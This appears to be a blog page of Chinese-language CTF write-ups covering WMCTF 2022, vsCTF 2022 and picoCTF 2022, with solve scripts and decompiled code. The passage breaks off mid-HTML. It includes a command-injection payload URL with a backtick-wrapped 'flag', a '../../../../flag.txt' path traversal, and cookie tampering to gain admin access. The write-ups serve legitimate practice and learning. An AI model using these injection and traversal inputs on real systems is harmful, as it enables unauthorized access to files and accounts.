<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad,unpad</span><br><span class="line"></span><br><span class="line">a= [<span class="number">0xef</span>,<span class="number">0x76</span>,<span class="number">0xd5</span>,<span class="number">0x41</span>,<span class="number">0x86</span>,<span class="number">0x57</span>,<span class="number">0x5a</span>,<span class="number">0x8e</span>,<span class="number">0xc2</span>,<span class="number">0xb8</span>,<span class="number">0xb6</span>,<span class="number">0xee</span>,<span class="number">0x8</span>,<span class="number">0x56</span>,<span class="number">0xb9</span>,<span class="number">0xb8</span>,<span class="number">0xe</span>,<span class="number">0x40</span>,<span class="number">0x75</span>,<span class="number">0x21</span>,<span class="number">0x41</span>,<span class="number">0x4b</span>,<span class="number">0x15</span>,<span class="number">0x71</span>,<span class="number">0x2c</span>,<span class="number">0x9b</span>,<span class="number">0x5e</span>,<span class="number">0x64</span>,<span class="number">0x35</span>,<span class="number">0x5b</span>,<span class="number">0x4a</span>,<span class="number">0x58</span>]</span><br><span class="line">a = <span class="built_in">bytearray</span>(a)</span><br><span class="line"></span><br><span class="line">b=[<span class="number">0</span>]*<span class="number">0x20</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>):</span><br><span class="line">  b[i]=<span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>)^i</span><br><span class="line">  <span class="comment"># for j in range(0x20,0x80):</span></span><br><span class="line">    <span class="comment"># if j^i==a[i]:</span></span><br><span class="line">  <span class="comment"># print(i,hex(ord(&#x27;0&#x27;)^i))</span></span><br><span class="line">b = <span class="built_in">bytearray</span>(b)</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;Welcome_To_WMCTF&#x27;</span></span><br><span class="line"></span><br><span class="line">aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line"><span class="comment"># d = aes.encrypt(b)</span></span><br><span class="line">d = aes.decrypt(a)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line">f=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>):</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>,<span class="number">0x80</span>):</span><br><span class="line">    <span class="keyword">if</span> j^i==d[i]:</span><br><span class="line">      f+=<span class="built_in">chr</span>(j)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(f)</span><br><span class="line"></span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/08/26/wmctf2022/" data-id="cuidpaVmFtR6bwiT2KaW5EgTo" data-title="2022 WMCTF" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-vsctf2022" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/07/17/vsctf2022/" class="article-date">
  <time class="dt-published" datetime="2022-07-17T03:07:10.000Z" itemprop="datePublished">2022-07-17</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/07/17/vsctf2022/">2022 vsCTF</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <ul>
<li><h3 id="web-sanity-check"><a href="#web-sanity-check" class="headerlink" title="web-sanity check"></a>web-sanity check</h3></li>
<li><h3 id="rev-binaryflood"><a href="#rev-binaryflood" class="headerlink" title="rev-binaryflood"></a>rev-binaryflood</h3><ul>
<li><pre><code class="language-cpp">__int64 __fastcall sub_40147F(char *a1, char *a2)
{
char v3; // [rsp+1Fh] [rbp-51h] BYREF
char a1a[32]; // [rsp+20h] [rbp-50h] BYREF
char v5[40]; // [rsp+40h] [rbp-30h] BYREF

std::allocator&lt;char&gt;::allocator(&amp;v3);
std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string(a1, &amp;unk_40400A, &amp;v3);
std::allocator&lt;char&gt;::~allocator(&amp;v3);
if ( a2 )
{
  sub_40147F(a1a, *((char **)a2 + 1));
  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator+=(a1, a1a);
  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(a1a);
  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator+=(a1, (unsigned int)*a2);
  sub_40147F(v5, *((char **)a2 + 2));
  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator+=(a1, v5);
  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(v5);
}
return (__int64)a1;
}
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* ### web-babyeval</span><br><span class="line">  *   ```bash</span><br><span class="line">      https://babyeval-twekqonvua-uc.a.run.app/?payload=directory`flag`</span><br></pre></td></tr></table></figure>

  得到flag

  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vsctf&#123;regExAin’tGoodEnufForWAF&#125;</span><br></pre></td></tr></table></figure>
</code></pre>
</li>
</ul>
</li>
<li><h3 id="web-babywasm"><a href="#web-babywasm" class="headerlink" title="web-babywasm"></a>web-babywasm</h3><ul>
<li><p>这段是rust写的webassembly的编译</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">(func $memcmp (;244;) (param $var0 i32) (param $var1 i32) (param $var2 i32) (result i32)</span><br><span class="line">  (local $var3 i32) (local $var4 i32) (local $var5 i32)</span><br><span class="line">  i32.const 0</span><br><span class="line">  local.set $var3</span><br><span class="line">  block $label0</span><br><span class="line">    local.get $var2</span><br><span class="line">    i32.eqz</span><br><span class="line">    br_if $label0</span><br><span class="line">    block $label1</span><br><span class="line">      loop $label2</span><br><span class="line">        local.get $var0</span><br><span class="line">        i32.load8_u</span><br><span class="line">        local.tee $var4</span><br><span class="line">        local.get $var1</span><br><span class="line">        i32.load8_u</span><br><span class="line">        local.tee $var5</span><br><span class="line">        i32.ne</span><br><span class="line">        br_if $label1</span><br><span class="line">        local.get $var0</span><br><span class="line">        i32.const 1</span><br><span class="line">        i32.add</span><br><span class="line">        local.set $var0</span><br><span class="line">        local.get $var1</span><br><span class="line">        i32.const 1</span><br><span class="line">        i32.add</span><br><span class="line">        local.set $var1</span><br><span class="line">        local.get $var2</span><br><span class="line">        i32.const -1</span><br><span class="line">        i32.add</span><br><span class="line">        local.tee $var2</span><br><span class="line">        i32.eqz</span><br><span class="line">        br_if $label0</span><br><span class="line">        br $label2</span><br><span class="line">      end $label2</span><br><span class="line">    end $label1</span><br><span class="line">    local.get $var4</span><br><span class="line">    local.get $var5</span><br><span class="line">    i32.sub</span><br><span class="line">    local.set $var3</span><br><span class="line">  end $label0</span><br><span class="line">  local.get $var3</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">  (func $func373 (param $var0 i32) (param $var1 i32) (param $var2 i32) (param $var3 i32) (result i32)</span><br><span class="line">  (local $var4 i32)</span><br><span class="line">  i32.const 0</span><br><span class="line">  local.set $var4</span><br><span class="line">  block $label0</span><br><span class="line">    local.get $var1</span><br><span class="line">    local.get $var3</span><br><span class="line">    i32.ne</span><br><span class="line">    br_if $label0</span><br><span class="line">    local.get $var0</span><br><span class="line">    local.get $var2</span><br><span class="line">    local.get $var1</span><br><span class="line">    call $memcmp</span><br><span class="line">    i32.eqz</span><br><span class="line">    local.set $var4</span><br><span class="line">  end $label0</span><br><span class="line">  local.get $var4</span><br><span class="line">)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><h3 id="pwn-ezorange"><a href="#pwn-ezorange" class="headerlink" title="pwn-ezorange"></a>pwn-ezorange</h3><ul>
<li><pre><code class="language-cpp">/* Safe-Linking:
   Use randomness from ASLR (mmap_base) to protect single-linked lists
   of Fast-Bins and TCache.  That is, mask the &quot;next&quot; pointers of the
   lists&#39; chunks, and also perform allocation alignment checks on them.
   This mechanism reduces the risk of pointer hijacking, as was done with
   Safe-Unlinking in the double-linked lists of Small-Bins.
   It assumes a minimum page size of 4096 bytes (12 bits).  Systems with
   larger pages provide less entropy, although the pointer mangling
   still works.  */
#define PROTECT_PTR(pos, ptr) \
  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))
#define REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)
</code></pre>
</li>
<li>并且<code>sysmalloc</code>直接通过<code>_int_free</code>释放掉了，所以<code>__free_hook</code>没用</li>
<li></li>
</ul>
</li>
<li><h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3></li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/07/17/vsctf2022/" data-id="cuidpIYpu52vj4i0ijikTL2iQ" data-title="2022 vsCTF" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-2022picoctfctf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/04/09/2022picoctfctf/" class="article-date">
  <time class="dt-published" datetime="2022-04-09T03:07:10.000Z" itemprop="datePublished">2022-04-09</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/04/09/2022picoctfctf/">picoctf2022</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="include-web"><a href="#include-web" class="headerlink" title="include-web"></a>include-web</h2><p>在script.js和style.css中藏了两部分的flag</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* style.css */</span></span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: lightblue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*  picoCTF&#123;1nclu51v17y_1of2_  */</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>script.js</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">greetings</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="title function_">alert</span>(<span class="string">&quot;This code is in a separate file!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//  f7w_2of2_f4593d9d&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>拼起来：<code>picoCTF{1nclu51v17y_1of2_f7w_2of2_f4593d9d}</code></p>
<h2 id="inspect-HTML-web"><a href="#inspect-HTML-web" class="headerlink" title="inspect HTML-web"></a>inspect HTML-web</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.21.6</span><br><span class="line">Date: Thu, 07 Apr 2022 12:42:58 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 916</span><br><span class="line">Last-Modified: Tue, 15 Mar 2022 07:17:06 GMT</span><br><span class="line">Connection: close</span><br><span class="line">ETag: &quot;62303d72-394&quot;</span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>On Histiaeus<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>On Histiaeus<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>However, according to Herodotus, Histiaeus was unhappy having to stay in</span><br><span class="line">       Susa, and made plans to return to his position as King of Miletus by </span><br><span class="line">       instigating a revolt in Ionia. In 499 BC, he shaved the head of his </span><br><span class="line">       most trusted slave, tattooed a message on his head, and then waited for </span><br><span class="line">       his hair to grow back. The slave was then sent to Aristagoras, who was </span><br><span class="line">       instructed to shave the slave&#x27;s head again and read the message, which </span><br><span class="line">       told him to revolt against the Persians.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span> Source: Wikipedia on Histiaeus <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--picoCTF&#123;1n5p3t0r_0f_h7ml_dd513514&#125;--&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>直接藏在http的返回respone里面</p>
<p><code>picoCTF{1n5p3t0r_0f_h7ml_dd513514}</code></p>
<h2 id="Local-Authority-web"><a href="#Local-Authority-web" class="headerlink" title="Local Authority-web"></a>Local Authority-web</h2><p>输入<code>username</code>和<code>password</code></p>
<p>输入错误的请求在respone中有secure.js内容如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">checkPassword</span>(<span class="params">username, password</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span>( username === <span class="string">&#x27;admin&#x27;</span> &amp;&amp; password === <span class="string">&#x27;strongPassword098765&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以输入admin 和 strongPassword098765</p>
<p>得到flag <code>picoCTF{j5_15_7r4n5p4r3n7_6309e949}</code></p>
<h2 id="Search-source-web"><a href="#Search-source-web" class="headerlink" title="Search source-web"></a>Search source-web</h2><p>藏在style.css中</p>
<p><code>picoCTF{1nsp3ti0n_0f_w3bpag3s_227d64bd}</code></p>
<h2 id="Forbidden-Paths-web"><a href="#Forbidden-Paths-web" class="headerlink" title="Forbidden Paths-web"></a>Forbidden Paths-web</h2><p>相对路径读 <code>../../../../flag.txt</code></p>
<p>直接读到flag <code>picoCTF{7h3_p47h_70_5ucc355_26b22ab3}</code></p>
<h2 id="Powercookie-web"><a href="#Powercookie-web" class="headerlink" title="Powercookie-web"></a>Powercookie-web</h2><p>在cookie中有这样一条</p>
<table>
<thead>
<tr>
<th>Name</th>
<th>Value</th>
<th>Domain</th>
<th>Path</th>
<th>Expires&#x2F;Max Age</th>
<th>Size</th>
<th>HttpOnly</th>
<th>Secure</th>
<th>SameSite</th>
<th>Priority</th>
</tr>
</thead>
<tbody><tr>
<td>isAdmin</td>
<td>0</td>
<td>saturn.picoctf.net</td>
<td>1</td>
<td>Session</td>
<td>8</td>
<td></td>
<td></td>
<td></td>
<td>Medium</td>
</tr>
</tbody></table>
<p>把isAdmin修改为1即可顺利登陆得到flag</p>
<p><code>picoCTF{gr4d3_A_c00k13_dcb9f091}</code></p>
<h2 id="Roboto-Sans-web"><a href="#Roboto-Sans-web" class="headerlink" title="Roboto Sans-web"></a>Roboto Sans-web</h2><p>robots.txt</p>
<p><strong>robots协议也叫robots.txt</strong>（统一小写）是一种存放于网站根目录下的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/ASCII">ASCII</a>编码的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%96%87%E6%9C%AC%E6%96%87%E4%BB%B6">文本文件</a>，它通常告诉网络<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E">搜索引擎</a>的漫游器（又称<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E8%9C%98%E8%9B%9B">网络蜘蛛</a>），此网站中的哪些内容是不应被搜索引擎的漫游器获取的，哪些是可以被漫游器获取的。因为一些系统中的URL是大小写敏感的，所以robots.txt的文件名应统一为小写。robots.txt应放置于网站的根目录下。如果想单独定义搜索引擎的漫游器访问子目录时的行为，那么可以将自定的设置合并到根目录下的robots.txt，或者使用robots<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%85%83%E6%95%B0%E6%8D%AE">元数据</a>（Metadata，又称元数据）。</p>
<p>robots协议并不是一个规范，而只是约定俗成的，所以并不能保证网站的隐私。</p>
<p>访问robots.txt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">User-agent *</span><br><span class="line">Disallow: /cgi-bin/</span><br><span class="line">Think you have seen your flag or want to keep looking.</span><br><span class="line"></span><br><span class="line">ZmxhZzEudHh0;anMvbXlmaW</span><br><span class="line">anMvbXlmaWxlLnR4dA==</span><br><span class="line">svssshjweuiwl;oiho.bsvdaslejg</span><br><span class="line">Disallow: /wp-admin/</span><br></pre></td></tr></table></figure>

<p>anMvbXlmaWxlLnR4dA&#x3D;&#x3D;</p>
<p>js&#x2F;myfile.txt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;Who_D03sN7_L1k5_90B0T5_a4f5cc70&#125;</span><br></pre></td></tr></table></figure>

<h2 id="secrets-web"><a href="#secrets-web" class="headerlink" title="secrets-web"></a>secrets-web</h2><p>访问</p>
<p>&#96;&#96;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;hidden/file.css&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Finally. You almost found me. you are doing well<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://media1.tenor.com/images/0a6aff9f825af62c05adfbd75039cc7b/tenor.gif?itemid=4648337&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Something Like That GIF - Andy Parksandrecreation Wtf GIFs&quot;</span> <span class="attr">style</span>=<span class="string">&quot;max-width: 833px; background-color: rgb(151, 121, 85);&quot;</span> <span class="attr">width</span>=<span class="string">&quot;833&quot;</span> <span class="attr">height</span>=<span class="string">&quot;937.125&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>里面有一个<code>hiddlen/file.css</code>，访问一下得到css里面还有一个套娃</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>LOGIN<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- css --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;superhidden/login.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;&quot;</span> <span class="attr">action</span>=<span class="string">&quot;/secret/assets/popup.js&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;row&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h2</span> <span class="attr">style</span>=<span class="string">&quot;text-align: center&quot;</span>&gt;</span></span><br><span class="line">              Login with Social Media or Manually</span><br><span class="line">            <span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;vl&quot;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;vl-innertext&quot;</span>&gt;</span>or<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col&quot;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;fb btn&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&quot;fa fa-facebook fa-fw&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> Login with Facebook</span><br><span class="line">              <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;twitter btn&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span 